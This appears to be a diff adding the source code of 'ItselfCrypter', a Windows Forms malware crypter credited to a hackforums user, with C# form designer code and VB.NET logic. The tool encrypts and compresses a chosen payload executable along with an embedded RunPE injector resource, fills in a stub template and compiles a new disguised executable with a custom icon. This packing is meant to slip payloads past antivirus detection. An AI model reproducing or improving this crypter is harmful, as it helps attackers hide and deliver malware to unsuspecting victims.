@@ -1,0 +1,311 @@
+   private void InitializeComponent()
+        {
+            this.BuildLog = new System.Windows.Forms.RichTextBox();
+            this.FilePathTextbox = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button3 = new System.Windows.Forms.Button();
+            this.IcoTextbox = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // BuildLog
+            // 
+            this.BuildLog.Location = new System.Drawing.Point(-1, 105);
+            this.BuildLog.Name = "BuildLog";
+            this.BuildLog.ReadOnly = true;
+            this.BuildLog.Size = new System.Drawing.Size(339, 143);
+            this.BuildLog.TabIndex = 0;
+            this.BuildLog.Text = "Made by BahNahNah\nhttp://www.hackforums.net/member.php?action=profile&uid=2388291" +
+    "\n";
+            // 
+            // FilePathTextbox
+            // 
+            this.FilePathTextbox.Location = new System.Drawing.Point(50, 12);
+            this.FilePathTextbox.Name = "FilePathTextbox";
+            this.FilePathTextbox.Size = new System.Drawing.Size(250, 20);
+            this.FilePathTextbox.TabIndex = 1;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(-4, 15);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(48, 13);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "Payload:";
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(306, 10);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(32, 23);
+            this.button1.TabIndex = 3;
+            this.button1.Text = "...";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click_1);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(-1, 64);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(339, 35);
+            this.button2.TabIndex = 4;
+            this.button2.Text = "Crypt";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(-4, 41);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(31, 13);
+            this.label2.TabIndex = 5;
+            this.label2.Text = "Icon:";
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(306, 38);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(32, 23);
+            this.button3.TabIndex = 7;
+            this.button3.Text = "...";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // IcoTextbox
+            // 
+            this.IcoTextbox.Location = new System.Drawing.Point(50, 38);
+            this.IcoTextbox.Name = "IcoTextbox";
+            this.IcoTextbox.Size = new System.Drawing.Size(250, 20);
+            this.IcoTextbox.TabIndex = 6;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(341, 251);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.IcoTextbox);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.FilePathTextbox);
+            this.Controls.Add(this.BuildLog);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Name = "Form1";
+            this.Text = "ItselfCrypter";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.RichTextBox BuildLog;
+        private System.Windows.Forms.TextBox FilePathTextbox;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.TextBox IcoTextbox;
+    }
+}
+
+
+
+
+
+Imports Microsoft.CSharp
+Imports System
+Imports System.CodeDom.Compiler
+Imports System.Collections.Generic
+Imports System.ComponentModel
+Imports System.Data
+Imports System.Drawing
+Imports System.IO
+Imports System.IO.Compression
+Imports System.Linq
+Imports System.Reflection
+Imports System.Resources
+Imports System.Security.Cryptography
+Imports System.Text
+Imports System.Threading.Tasks
+Imports System.Windows.Forms
+
+Namespace ItselfCrypt
+    Public Partial Class Form1
+        Inherits Form
+
+        Public Sub New()
+            InitializeComponent()
+        End Sub
+
+        Private Sub button1_Click(ByVal sender As Object, ByVal e As EventArgs)
+            Dim Ty As Type
+
+            Using ofd As OpenFileDialog = New OpenFileDialog()
+                ofd.ShowDialog()
+                Ty = Assembly.LoadFile(ofd.FileName).[GetType]("Resource.reflect")
+            End Using
+
+            Using ofd As OpenFileDialog = New OpenFileDialog()
+                ofd.ShowDialog()
+                Ty.GetMethod("Run").Invoke(Nothing, New Object() {Assembly.GetExecutingAssembly().Location, "", File.ReadAllBytes(ofd.FileName), False})
+            End Using
+        End Sub
+
+        Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs)
+        End Sub
+
+        Private Sub BuildCode(ByVal code As String, ByVal output As String, ByVal ico As String, ParamArray resources As String())
+            Dim codeProvider As CSharpCodeProvider = New CSharpCodeProvider(New Dictionary(Of String, String)() From {
+                {"CompilerVersion", "v4.0"}
+            })
+            Dim icc As ICodeCompiler = codeProvider.CreateCompiler()
+            Dim parameters As System.CodeDom.Compiler.CompilerParameters = New CompilerParameters({"mscorlib.dll", "System.dll", "System.Core.dll", "System.Windows.Forms.dll", "System.Xml.dll", "System.Xml.Linq.dll"})
+            parameters.GenerateExecutable = True
+            parameters.OutputAssembly = output
+            parameters.CompilerOptions = "/platform:X86 /target:winexe"
+            parameters.CompilerOptions += String.Format(" /win32icon:""{0}""", ico)
+
+            For Each res As String In resources
+                parameters.EmbeddedResources.Add(res)
+            Next
+
+            Dim results As CompilerResults = icc.CompileAssemblyFromSource(parameters, code)
+
+            If results.Errors.Count > 0 Then
+
+                For Each CompErr As CompilerError In results.Errors
+                    BuildLog.Text = BuildLog.Text & "Line number " + CompErr.Line & ", Error Number: " & CompErr.ErrorNumber & ", '" & CompErr.ErrorText & ";" & Environment.NewLine & Environment.NewLine
+                Next
+            Else
+                BuildLog.Text += "Successfull build." & vbLf
+            End If
+        End Sub
+
+        Private Shared Function Compress(ByVal b As Byte()) As Byte()
+            Using ms As MemoryStream = New MemoryStream()
+
+                Using ds As DeflateStream = New DeflateStream(ms, CompressionMode.Compress)
+                    ds.Write(b, 0, b.Length)
+                End Using
+
+                Return ms.ToArray()
+            End Using
+        End Function
+
+        Private Shared Function _Encrypt(ByVal Payload As Byte(), ByVal _key As String) As Byte()
+            Try
+                Dim pdb As PasswordDeriveBytes = New PasswordDeriveBytes(_key, Encoding.UTF8.GetBytes("2388291"))
+                Dim ms As MemoryStream = New MemoryStream()
+                Dim aes As Aes = New AesManaged()
+                aes.Key = pdb.GetBytes(aes.KeySize / 8)
+                aes.IV = pdb.GetBytes(aes.BlockSize / 8)
+                Dim cs As CryptoStream = New CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write)
+                cs.Write(Payload, 0, Payload.Length)
+                cs.Close()
+                Return ms.ToArray()
+            Catch
+                Environment.[Exit](0)
+                Return New Byte() {}
+            End Try
+        End Function
+
+        Private Sub button1_Click_1(ByVal sender As Object, ByVal e As EventArgs)
+            Using ofd As OpenFileDialog = New OpenFileDialog()
+
+                If ofd.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
+                    ofd.Filter = "Payload|*.exe"
+                    FilePathTextbox.Text = ofd.FileName
+                End If
+            End Using
+        End Sub
+
+        Private Sub button2_Click(ByVal sender As Object, ByVal e As EventArgs)
+            If FilePathTextbox.Text = "" Then
+                MessageBox.Show("Select a file!")
+                Return
+            End If
+
+            Dim path As String = FilePathTextbox.Text
+
+            If Not File.Exists(path) Then
+                MessageBox.Show("File Invalid!")
+                Return
+            End If
+
+            Dim savepath As String
+
+            Using sfd As SaveFileDialog = New SaveFileDialog()
+                sfd.Filter = "Output|*.exe"
+                If sfd.ShowDialog() <> System.Windows.Forms.DialogResult.OK Then Return
+                savepath = sfd.FileName
+            End Using
+
+            Dim res As String = Guid.NewGuid().ToString().Replace("-", "")
+            Dim dropDir As String = System.IO.Path.Combine(Environment.CurrentDirectory, "Temp")
+            Dim encRes As String = Path.Combine(dropDir, res & ".resources")
+            If Not Directory.Exists(dropDir) Then Directory.CreateDirectory(dropDir)
+            Dim injResName As String = "inj" & Guid.NewGuid().ToString().Replace("-", "")
+            Dim payloadResName As String = "pay" & Guid.NewGuid().ToString().Replace("-", "")
+            Dim Payload As Byte() = File.ReadAllBytes(path)
+            Dim injBytes As Byte() = ItselfCrypt.Properties.Resources.RunpeResource
+            Dim encKey As String = "enc" & Guid.NewGuid().ToString().Replace("-", "")
+            Payload = _Encrypt(Payload, encKey)
+            injBytes = _Encrypt(injBytes, encKey)
+            Payload = Compress(Payload)
+            injBytes = Compress(injBytes)
+            Dim stubCode As String = ItselfCrypt.Properties.Resources.StubCode
+            stubCode = stubCode.Replace("[ResName]", res)
+            stubCode = stubCode.Replace("[InjRes]", injResName)
+            stubCode = stubCode.Replace("[PayloadRes]", payloadResName)
+            stubCode = stubCode.Replace("[EncKey]", encKey)
+
+            Using Writer As ResourceWriter = New ResourceWriter(encRes)
+                Writer.AddResource(injResName, injBytes)
+                Writer.AddResource(payloadResName, Payload)
+                Writer.Generate()
+            End Using
+
+            Dim ico As String = IcoTextbox.Text
+
+            If ico = "" OrElse Not ico.EndsWith(".ico") OrElse Not File.Exists(ico) Then
+                ico = Path.Combine(dropDir, "def.ico")
+                File.WriteAllBytes(ico, ItselfCrypt.Properties.Resources.ico)
+            End If
+
+            BuildCode(stubCode, savepath, ico, encRes)
+            Directory.Delete(dropDir, True)
+        End Sub
+
+        Private Shared Function Decompress(ByVal b As Byte()) As Byte()
+            Using uncompressed As MemoryStream = New MemoryStream()
+
+                Using compressed As MemoryStream = New MemoryStream(b)
+
+                    Using ds As DeflateStream = New DeflateStream(compressed, CompressionMode.Decompress)
+                        ds.CopyTo(uncompressed)
+                        Return uncompressed.ToArray()
+                    End Using
+                End Using
+            End Using
+        End Function
+
+        Private Sub button3_Click(ByVal sender As Object, ByVal e As EventArgs)
+            Using ofd As OpenFileDialog = New OpenFileDialog()
+                ofd.Filter = "Icon|*.ico"
+
+                If ofd.ShowDialog() = System.Windows.Forms.DialogResult.OK Then
+                    IcoTextbox.Text = ofd.FileName
+                End If
+            End Using
+        End Sub
+    End Class
+End Namespace
